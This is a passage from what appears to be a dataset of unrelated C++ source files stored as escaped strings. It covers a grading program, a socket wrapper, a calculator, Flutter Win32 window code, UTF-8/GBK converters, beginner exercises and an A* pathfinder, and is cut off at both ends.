std::cout<<\"Invalid option.\"<<std::endl;\n\t     ee2 = gr[5];\n\t     cpj2 = F;\n\t     }\t \n\t //EEE403.\n\t  if(EEE403 >= 70 && EEE403 <= 100){\n\t     ee3 = gr[0];\n\t     cpj3 = A;\n\t }\n\t else if(EEE403 >= 60 && EEE403 <= 69){\n\t     ee3 = gr[1];\n\t     cpj3 = B;\n\t }\n\t else if(EEE403 >= 50 && EEE403 <= 59){\n\t     ee3 = gr[2];\n\t     cpj3 = C;\n\t }\n\t else if(EEE403 >= 45 && EEE403 <= 49){\n\t     ee3 = gr[3];\n\t     cpj3 = D;\n\t }\n\t else if(EEE403 >= 40 && EEE403 <= 44){\n\t     ee3 = gr[4];\n\t     cpj3 = E;\n\t }\n\t else if(EEE403 >= 0 && EEE403 <= 39){\n\t     ee3 = gr[5];\n\t     cpj3 = F;\n\t }\n\t else{\n\t     std::cout<<\"Invalid option.\"<<std::endl;\n\t     ee3 = gr[5];\n\t     cpj3 = F;\n\t     }\t \n\t //EEE404.\n\t if(EEE404 >= 70 && EEE404 <= 100){\n\t     ee4 = gr[0];\n\t     cpj4 = A;\n\t }\n\t else if(EEE404 >= 60 && EEE404 <= 69){\n\t     ee4 = gr[1];\n\t     cpj4 = B;\n\t }\n\t else if(EEE404 >= 50 && EEE404 <= 59){\n\t     ee4 = gr[2];\n\t     cpj4 = C;\n\t }\n\t else if(EEE404 >= 45 && EEE404 <= 49){\n\t     ee4 = gr[3];\n\t     cpj4 = D;\n\t }\n\t else if(EEE404 >= 40 && EEE404 <= 44){\n\t     ee4 = gr[4];\n\t     cpj4 = E;\n\t }\n\t else if(EEE404 >= 0 && EEE404 <= 39){\n\t     ee4 = gr[5];\n\t     cpj4 = F;\n\t }\n\t else{\n\t     std::cout<<\"Invalid option.\"<<std::endl;\n\t     ee4 = gr[5];\n\t     cpj4 = F;\n\t     }\n\t John(ee1, ee2, ee3, ee4, cpj1, cpj2, cpj3, cpj4);\n\t    }\n\t    \n\t    \n\t     //AMAKA\n\t else if(option == \"DE.2021/2947\"){\n\t \n\t //A. Amaka\n\t std::cout<<\"\\nSTUDENT: \"<<std::endl;\n\t EEE401 = getInput<unsigned int>(\"Enter the EEE401 score: \");\t\n\t EEE402 = getInput<unsigned int>(\"Enter the EEE402 score: \");\t \n\t EEE403 = getInput<unsigned int>(\"Enter the EEE403 score: \");\t \n\t EEE404 = getInput<unsigned int>(\"Enter the EEE404 score: \");\n\t //EEE401.\n\t if(EEE401 >= 70 && EEE401 <= 100){\n\t     ee1 = gr[0];\n\t     cpj1 = A;\n\t }\n\t else if(EEE401 >= 60 && EEE401 <= 69){\n\t     ee1 = gr[1];\n\t     cpj1 = B;\n\t }\n\t else if(EEE401 >= 50 && EEE401 <= 59){\n\t     ee1 = gr[2];\n\t     cpj1 = C;\n\t }\n\t else if(EEE401 >= 45 && EEE401 <= 49){\n\t     ee1 = gr[3];\n\t     cpj1 = D;\n\t }\n\t else if(EEE401 >= 40 && EEE401 <= 44){\n\t     ee1 = gr[4];\n\t     cpj1 = E;\n\t }\n\t else if(EEE401 >= 0 && EEE401 <= 39){\n\t     ee1 = gr[5];\n\t     cpj1 = F;\n\t }\t\n\t else{\n\t     std::cout<<\"Invalid option.\"<<std::endl;\n\t     ee1 = gr[5];\n\t     cpj1 = F;\n\t     } \n\t //EEE402.\n\t if(EEE402 >= 70 && EEE402 <= 100){\n\t     ee2 = gr[0];\n\t     cpj2 = A;\n\t }\n\t else if(EEE402 >= 60 && EEE402 <= 69){\n\t     ee2 = gr[1];\n\t     cpj2 = B;\n\t }\n\t else if(EEE402 >= 50 && EEE402 <= 59){\n\t   ",
    "#include \"Socket.h\"\n\nSocket::Socket(int fd):fd_(fd){\n    assert(fd_ != -1);\n}\n\nSocket::~Socket(){\n    if(fd_ >= 0)\n        close(fd_);\n}\n\nint Socket::getFd() const{\n    return fd_;\n}\n\nvoid Socket::setReuseaddr(bool on){\n    int opt = 1;\n    if(on)\n        setsockopt(fd_, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n}\n\nvoid Socket::setReuseport(bool on){\n    int opt = 1;\n    if(on)\n        setsockopt(fd_, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));\n}\n\nvoid Socket::setTcpnodelay(bool on){\n    int opt = 1;\n    if(on)\n        setsockopt(fd_, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));\n}\n\nvoid Socket::setKeepalive(bool on){\n    int opt = 1;\n        if(on)\n     setsockopt(fd_, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt));\n}\n\nvoid Socket::Bind(const InterAddress& addr){\n    int ret = bind(fd_, addr.getAddr(), sizeof(sockaddr));\n        assert(ret != -1);\n    setIpAndPort(addr.getIp(), addr.getPort());//\u5bf9\u4e8e\u76d1\u542cfd\u800c\u8a00\u5728bind\u83b7\u53d6\u76d1\u542cfd\u7ed1\u5b9a\u7684ip\u4ee5\u53ca\u7aef\u53e3\n}\n\nvoid Socket::Listen(int n){\n    int ret = listen(fd_, n);\n        assert(ret != -1);\n}\n\nint Socket::Accept(InterAddress &clientaddr){\n    socklen_t len = sizeof(sockaddr_in);\n    int ret = accept4(fd_, clientaddr.getAddr(), &len, SOCK_NONBLOCK);//\u5c06\u8fde\u63a5sock\u8bbe\u7f6e\u4e3a\u975e\u963b\u585e\n        assert(ret >= 0);\n    return ret;   \n}\n\nint createNonblokingSock(){    \n    int listenfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);\n    assert(listenfd >= 0);\n    return listenfd;\n}\n\nstd::string Socket::getIp()const{\n    return ip_;\n}\n\nuint16_t Socket::getPort()const{\n    return port_;\n}\n\nvoid Socket::setIpAndPort(const char*ip, uint16_t port){\n    ip_ = ip;\n    port_ = port;\n}",
    "// Online C++ compiler to run C++ program online\r\n#include <iostream>\r\n\r\nint main() {\r\n    char op;\r\n    float num1, num2;\r\n    for(int run = 0; run != 1;){\r\n        std::cout << \"Enter operator (+, -, *, /): \";\r\n        std::cin >> op;\r\n    \r\n        std::cout << \"Enter two numbers: \";\r\n        std::cin >> num1 >> num2;\r\n    \r\n        switch(op) {\r\n            case '+':\r\n                std::cout << num1 << \" + \" << num2 << \" = \" << num1 + num2 << std::endl;\r\n                break;\r\n            case '-':\r\n                std::cout << num1 << \" - \" << num2 << \" = \" << num1 - num2 << std::endl;\r\n                break;\r\n            case '*':\r\n                std::cout << num1 << \" * \" << num2 << \" = \" << num1 * num2 << std::endl;\r\n                break;\r\n            case '/':\r\n                if(num2 != 0)\r\n                    std::cout << num1 << \" / \" << num2 << \" = \" << num1 / num2 << std::endl;\r\n                else\r\n                    std::cout << \"Error! Division by zero!\" << std::endl;\r\n                break;\r\n            default:\r\n                std::cout << \"Error! Invalid operator!\" << std::endl;\r\n        }\r\n    }\r\n    return 0;\r\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"common_utf8.h\"\r\n\r\n#include <locale>\r\n\r\n#ifdef _WIN32\r\n#include <codecvt>\n#include <windows.h>\r\n#endif\r\n\r\n#ifdef _WIN32\r\nnamespace\n{\n\tclass chs_codecvt : public std::codecvt_byname<wchar_t, char, std::mbstate_t>\n\t{\n\tpublic:\n\t\t// you can create a gbk codecvt by name 'chs' or '.936' on windows platform\n\t\t// or 'zh_CN.GBK' on linux platform, and 'zh_cn.gb2312' on macOS platform\n\t\tchs_codecvt() : codecvt_byname(\"chs\")\n\t\t{ }\n\t};\n\n\tstatic inline bool has_utf8_bom(const char *in_char)\n\t{\n\t\tuint8_t *in = (uint8_t *)in_char;\n\t\treturn (in && in[0] == 0xef && in[1] == 0xbb && in[2] == 0xbf);\n\t}\n}\r\n#endif\r\n\r\nbool is_utf8_chars(const uint8_t *str)\r\n{\r\n\tconst uint8_t *byte;\r\n\tuint32_t codepoint;\r\n\tuint32_t min;\r\n\r\n\twhile (*str)\r\n\t{\r\n\t\tbyte = str;\r\n\t\tcodepoint = *(byte++);\r\n\t\tuint32_t top = (codepoint & 0x80) >> 1;\r\n\t\tif ((codepoint & 0xc0) == 0x80 || codepoint >= 0xFE)\r\n\t\t{\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\twhile (codepoint & top)\r\n\t\t{\r\n\t\t\tint tmp = *(byte++) - 128;\r\n\t\t\tif (tmp >> 6)\r\n\t\t\t{\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t\tcodepoint = (codepoint << 6) + tmp;\r\n\t\t\ttop <<= 5;\r\n\t\t}\r\n\t\tcodepoint &= (top << 1) - 1;\r\n\r\n\t\tmin = byte - str == 1 ? 0 : byte - str == 2 ? 0x80 : 1 << (5 * (byte - str) - 4);\r\n\t\tif (codepoint < min || codepoint >= 0x110000 ||\r\n\t\t\tcodepoint == 0xFFFE ||\r\n\t\t\t(codepoint >= 0xD800 && codepoint <= 0xDFFF))\r\n\t\t{\r\n\t\t\treturn false;\r\n\t\t}\r\n\r\n\t\tstr = byte;\r\n\t}\r\n\r\n\treturn true;\r\n}\r\n\r\nbool is_utf8_str(const std::string& str)\r\n{\r\n\t//the character bytes count\r\n\tchar bytesCount = 0;\r\n\tunsigned char chr;\r\n\tbool allAreAscii = true;\r\n\r\n\tstd::string::const_iterator it;\r\n\tfor (it = str.begin(); it != str.end(); it++)\r\n\t{\r\n\t\tchr = *it;\r\n\r\n\t\tif ((chr & 0x80) != 0)\r\n\t\t{\r\n\t\t\tallAreAscii = false;\r\n\t\t}\r\n\r\n\t\tif (bytesCount == 0)\r\n\t\t{\r\n\t\t\tif (chr >= 0x80)\r\n\t\t\t{\r\n\t\t\t\tif (chr >= 0xFC && chr <= 0xFD)\r\n\t\t\t\t{\r\n\t\t\t\t\tbytesCount = 6;\r\n\t\t\t\t}\r\n\t\t\t\telse if (chr >= 0xF8)\r\n\t\t\t\t{\r\n\t\t\t\t\tbytesCount = 5;\r\n\t\t\t\t}\r\n\t\t\t\telse if (chr >= 0xF0)\r\n\t\t\t\t{\r\n\t\t\t\t\tbytesCount = 4;\r\n\t\t\t\t}\r\n\t\t\t\telse if (chr >= 0xE0)\r\n\t\t\t\t{\r\n\t\t\t\t\tbytesCount = 3;\r\n\t\t\t\t}\r\n\t\t\t\telse if (chr >= 0xC0)\r\n\t\t\t\t{\r\n\t\t\t\t\tbytesCount = 2;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\tbytesCount--;\r\n\t\t\t}\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tif ((chr & 0xC0) != 0x80)\r\n\t\t\t{\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t\tbytesCount--;\r\n\t\t}\r\n\t}\r\n\r\n\t//left bytes breaks the utf8 rules\r\n\tif (bytesCount > 0)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\t//all characters are ascii-coded, they are utf8\r\n\tif (allAreAscii)\r\n\t{\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn true;\r\n}\r\n\r\n#ifdef _WIN32\r\nstd::string gbk_to_utf8(const std::string& str)\n{\n\tstd::wstring_convert<chs_codecvt> converterGBK;\n\tstd::wstring tmp_wstr = converterGBK.from_bytes(str);\n\n\tstd::wstring_convert<std::codecvt_utf8<wchar_t>> converterUTF8;\n\treturn converterUTF8.to_bytes(tmp_wstr);\n}\n\nstd::string utf8_to_gbk(const std::string& str)\n{\n\tstd::wstring_convert<std::codecvt_utf8<wchar_t>> converterUTF8;\n\tstd::wstring tmp_wstr = converterUTF8.from_bytes(str);\n\n\tstd::wstring_convert<chs_codecvt> converterGBK;\n\treturn converterGBK.to_bytes(tmp_wstr);\n}\n\nsize_t utf8_to_wchar(const char *in, size_t in_size, wchar_t *out,\n\tsize_t out_size)\n{\n\tint insize = (int)in_size;\n\tint ret;\n\n\tif (insize == 0)\n\t{\n\t\tinsize = (int)strlen(in);\n\t}\n\n\t/* prevent bom from being used in the string */\n\tif (has_utf8_bom(in))\n\t{\n\t\tif (insize >= 3)\n\t\t{\n\t\t\tin += 3;\n\t\t\tinsize -= 3;\n\t\t}\n\t}\n\n\tret = MultiByteToWideChar(CP_UTF8, 0, in, insize, out, (int)out_size);\n\n\treturn (ret > 0) ? (size_t)ret : 0;\n}\n\nsize_t wchar_to_utf8(const wchar_t *in, size_t in_size, char *out,\n\tsize_t out_size)\n{\n\tint insize = (int)in_size;\n\tint ret;\n\n\tif (insize == 0)\n\t{\n\t\tinsize = (int)wcslen(in);\n\t}\n\n\tret = WideCharToMultiByte(CP_UTF8, 0, in, insize, out, (int)out_size,\n\t\tNULL, NULL);\n\n\treturn (ret > 0) ? (size_t)ret : 0;\n}\n#endif",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\nvoid somando();\nint fibonacci(int n);\nint busca();\nstring inverte();\n\nint main() {\n\tsomando(); //Q01\n\tcout << endl;\n\tbusca(); //Q02\n\tcout << endl;\n\tinverte(); //Q05\n\n\treturn 0;\n}\n\n\n// Questao 01\nvoid somando() {\n\tint i = 13, k = 0, s = 0;\n\twhile (k < i) {\n\t\tk += 1;\n\t\ts += k;\n\t}\n\tcout << \"O resultado da soma e: \" << s << endl;\n}\n\n// Questao 02\nint fibonacci(int n) {\n\tif (n <= 1)\n\t\treturn n;\n\telse\n\t\treturn fibonacci(n - 1) + fibonacci(n - 2);\n}\n\nint busca() {\n\tvector<int> fib;\n\tint indice_encontrado = -1;\n\tint procurado;\n\n\tcout << \"Digite o numero a ser buscado: \";\n\tcin >> procurado;\n\n\tfor (int i = 0; i < 20; i++) {\n\t\tfib.push_back(fibonacci(i));\n\t\tif (fib[i] == procurado) {\n\t\t\tindice_encontrado = i;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (indice_encontrado != -1) {\n\t\tcout << \"Numero encontrado na sequencia na posicao \" << indice_encontrado << endl;\n\t}\n\telse {\n\t\tcout << \"Numero nao encontrado na sequencia\" << endl;\n\t}\n\n\treturn indice_encontrado;\n}\n\n// Questao 05\nstring inverte() {\n\tstring entrada, saida;\n\tcout << \"Insira a string que sera invertida: \";\n\tcin >> entrada;\n\tfor (int i = entrada.size(); i >= 0; i--) {\n\t\tsaida += entrada[i];\n\t}\n\tcout << \"A string invertida e: \" <<  saida << endl;\n\treturn saida;\n}\n",
    "#include<iostream>\n#include<vector>\n#include<string.h>\n#include<queue>\n#include<fstream>\nconst int N = 200;\nbool vis[N][N]; // // A*\u7b97\u6cd5\u4e2d\u68c0\u6d4b\u662f\u5426\u8d70\u8fc7\u6b64\u8def\u5f84\nconst int n=N;// \u5730\u56fe\u7684\u5927\u5c0f, \u8fd9\u91cc\u6700\u5927\u4e0d\u80fd\u8d85\u8fc7N\u8fd9\u4e2a\u5e38\u91cf\u7684\u503c\n\nchar Map[N][N];\t\t// \u8f93\u5165\u7684\u5730\u56fe\nclass Position {\npublic:\n\tint x;\n\tint y;\n\tPosition(int x, int y) {\n\t\tthis->x = x;\n\t\tthis->y = y;\n\t}\n\tPosition() {\n\t\tx = -1;\n\t\ty = -1;\n\t}\n\tbool operator==(const Position &a) {\n\t\treturn (this->x == a.x) && (this->y == a.y);\n\t}\n};\nclass Point {\npublic:\n\tint x, y;\n\tint f, g, h;\n\tbool operator==(const Point& pos) {\n\t\treturn (pos.x == x && pos.y == y);\n\t}\n\tPoint(const Position& pos) {\n\t\tx = pos.x;\n\t\ty = pos.y;\n\t}\n\tPoint() {\t}\n\tvoid geth(Point beginpos, Point endpos) {\n\t\tint x = std::abs(beginpos.x = endpos.x);\n\t\tint y = std::abs(beginpos.y - endpos.y);\n\t\th = x + y;\n\t}\n\t\n\tvoid getf() {\n\t\tf = g + h;\n\t}\n};\nclass TreeNode {\n\t\npublic:\n\tPoint pos;\n\tTreeNode* pParent;\n\tstd::vector<TreeNode*> pChild;\n\t\n\t\n\tTreeNode(Point pos) {\n\t\tthis->pos = pos;\n\t\tpParent = nullptr;\n\t}\n};\nbool CanWalk(char ch[N][N], bool vis[N][N], const Point& pos)\n{\n\t//\u5982\u679c\u8d8a\u754c\uff0c\u4e0d\u80fd\u8d70\n\tif (pos.x <= 0 || pos.y <= 0 || pos.x > n || pos.y > n)\n\t{\n\t\treturn false;\n\t}\n\t//\u8d8a\u754c\n\t\n\tif (ch[pos.x][pos.y] =='#'||ch[pos.x][pos.y]=='*'|| ch[pos.x][pos.y] == 'A')// \u540e\u9762\u9700\u8981\u4fee\u6539, \u6b64\u5904\u68c0\u6d4b\u662f\u5426\u5904\u4e8e\u7a7a\u5730, \u540e\u7eed\u9700\u8981\u8003\u8651\u5bfb\u8def\u65f6\u8def\u4e0a\u7684\u673a\u5668\u4eba\n\t{\n\t\treturn false;\n\t}\n\t\n\tif (vis[pos.x][pos.y])\n\t{\n\t\treturn false;\n\t}\n\treturn true;//\u5426\u5219\u80fd\u8d70\n}\n\n\n\n\nstd::vector<Position> GetPathbyPosition(Position start, Position end) {\n\t//\u8fd4\u56de\u4e00\u4e2avector, \u5176\u4e2d\n\t//0\u4ee3\u8868\u5411\u53f3\n\t//1\u4ee3\u8868\u5411\u5de6\n\t//3\u4ee3\u8868\u5411\u4e0b\n\t//2\u4ee3\u8868\u5411\u4e0a \n\t//\u5982\u679c\u9700\u8981\u5f97\u5230\u4e24\u70b9\u95f4\u66fc\u54c8\u987f\u8ddd\u79bb\u83b7\u53d6vector\u7684size\u5373\u53ef\n\t//\u521d\u59cb\u5316\u90e8\u5206\n\tmemset(vis, false, sizeof(vis));\n\tPoint beginpos(start);\n\tPoint endpos(end);\n\tTreeNode* pRoot = new TreeNode(beginpos);\n\tstruct cmp {\n\t\tbool operator()(const TreeNode* a, const TreeNode*b) {\n\t\t\treturn a->pos.f > b->pos.f;\n\t\t}\n\t};\n\tstd::priority_queue<TreeNode*,std::vector<TreeNode*>,cmp> buff;//\u6682\u5b58\u63a2\u7d22\u8fc7\u7684\u70b9\n\tTreeNode* pCurrent = pRoot;\n\tTreeNode* pTemp = nullptr;\n\tbool isfind = false;\n\t//\u521d\u59cb\u5316\u7ed3\u675f\n\tstd::vector<Position> Path;\n\t\n\twhile (1) {\n\t\t\n\t\t\n\t\tfor (int i = 0; i <= 3; i++) {\n\t\t\tpTemp = new TreeNode(pCurrent->pos);\n\t\t\tswitch (i)\n\t\t\t{\n\t\t\t\tcase 2://up\n\t\t\t\tpTemp->pos.x--;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\tcase 3://down\n\t\t\t\tpTemp->pos.x++;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\tcase 1://left\n\t\t\t\tpTemp->pos.y--;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\tcase 0://right\n\t\t\t\tpTemp->pos.y++;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\t\n\t\t\t}\n\t\t\tif (CanWalk(Map, vis, pTemp->pos)) {\n\t\t\t\tpTemp->pos.geth(pTemp->pos, endpos);\n\t\t\t\tpTemp->pos.getf();\n\t\t\t\tpCurrent->pChild.push_back(pTemp);\n\t\t\t\tpTemp->pParent = pCurrent;\n\t\t\t\tbuff.push(pTemp);\n\t\t\t\t\n\t\t\t\tvis[pTemp->pos.x][pTemp->pos.y] = true;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tdelete pTemp;\n\t\t\t\tpTemp = nullptr;\n\t\t\t}\n\t\t}\n\t\t\n\t\tif (buff.size()==0) {\n\t\t\t//\u5982\u679c\u5bfb\u627e\u5931\u8d25,\u65e0\u8def\u53ef\u8d70\n\t\t\treturn std::vector<Position>();\n\t\t}\n\t\t\n\t\telse {\n\t\t\tpCurrent = buff.top();\n\t\t\tbuff.pop();//\u5f39\u51fa\u8be5\u70b9, \u8bf4\u660e\u5176\u5df2\u7ecf\u88ab\u5bfb\u627e\u8fc7\n\t\t}\n\t\t\n\t\tif (pCurrent->pos == endpos) {//\u627e\u5230\u4e86\n\t\t\tisfind = true;\n\t\t\t\n\t\t\tbreak;\n\t\t}\n\t\t\n\t}\n\t\n\tif (isfind) {\n\t\twhile (pCurrent != nullptr) {\n\t\t\tPosition tmp(pCurrent->pos.x, pCurrent->pos.y);\n\t\t\tPath.push_back(tmp);\n\t\t\tpCurrent = pCurrent->pParent;\n\t\t}\n\t\t\n\t}\n\t\n\treturn Path;\n}\n\nstd::vector<std::string>ConvertToOperationCodeByPostion(std::vector<Position> Path, std::string opCode[4] ){\n\t\n\t\n\t\n\tstd::vector<std::string>anspath;\n\tPosition startcpy = Path.back();\n\tPath.pop_back();\n\twhile (!Path.empty()) {\n\t\tauto tmp = Path.back();\n\t\tPath.pop_back();\n\t\tif ((startcpy.x - tmp.x) > 0) {\n\t\t\t\n\t\t\tanspath.push_back(opCode[2]);\t\n\t\t}\n\t\telse if ((startcpy.x - tmp.x) < 0) {\n\t\t\tanspath.push_back(opCode[3]);\n\t\t}\n\t\telse if ((startcpy.y - tmp.y) > 0) {\n\t\t\tanspath.push_back(opCode[1]);\n\t\t}\n\t\telse if ((startcpy.y - tmp.y) < 0) {\n\t\t\tanspath.push_back(opCode[0]);\n\t\t}\n\t\tstartcpy = tmp;\n\t}\n\treturn anspath;\n}\n\nint main(int argc, char *argv[]){\n\t\n\t// if not assign opCode \n\t// \t\tuse default opCode\n\tstd::string opCode[5]={\"0\",\"1\",\"2\",\"3\"};  \n\t//2 means up  ,3 means down ,0 means right ,1 means left  \n\t\n\t\n\tstd::string mapdir;\n\tPosition s;\n\tPosition e;\n\tint mer=0,der=0;\n\t\n\tfor (int i = 1; i < argc; ++i) {\n\t\tstd::string arg = argv[i];\n\t\tif (arg == \"-m\") {\n\t\t\tmer++;\n\t\t\tif (i + 1 < argc) { // \u786e\u4fdd\u540e\u9762\u6709\u53c2\u6570\n\t\t\t\tmapdir = argv[++i]; // \u83b7\u53d6\u53c2\u6570\u5e76\u589e\u52a0i\n\t\t\t} else {\n\t\t\t\tstd::cerr << \"argument error\" << std::endl;\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t\tstd::fstream mp(mapdir,std::ios::in);\n\t\t\t\n\t\t\tif(!mp){\n\t\t\t\tstd::cerr<<\"invalid map dirction\\n\";\n\t\t\t\t\n\t\t\t}\n\t\t\tfor (int i = 0; i < n; i++) {\n\t\t\t\tfor (int j = 0; j < n; j++) {\n\t\t\t\t\tmp >> Map[i][j];\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t}\n\t\telse if (arg == \"-d\") {\n\t\t\tder++;\n\t\t\tif (i + 4 < argc) { \n\t\t\t\tint sx = std::stoi( argv[++i]);\n\t\t\t\tint sy = std::stoi(argv[++i]);\n\t\t\t\tint ex =std::stoi( argv[++i]);\n\t\t\t\tint ey =std::stoi( argv[++i]);\n\t\t\t\ts=Position(sx,sy);\n\t\t\t\te=Position(ex,ey);\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t} else {\n\t\t\t\tstd::cerr << \"argument error\" << std::endl;\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t}\n\t\n\t\n\t\n\t\n\tauto p=GetPathbyPosition(s,e);\t\n\t\n\tstd::fstream ans(\"./ans.txt\",std::ios::out);\n\t\n\t\t\n\tfor(auto i:p){\n\t\tans<<\"(\"<<i.x<<\",\"<<i.y<<\") \";\n\t} \n\tans<<std::endl;\n\tauto o=ConvertToOperationCodeByPostion(p,opCode",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * 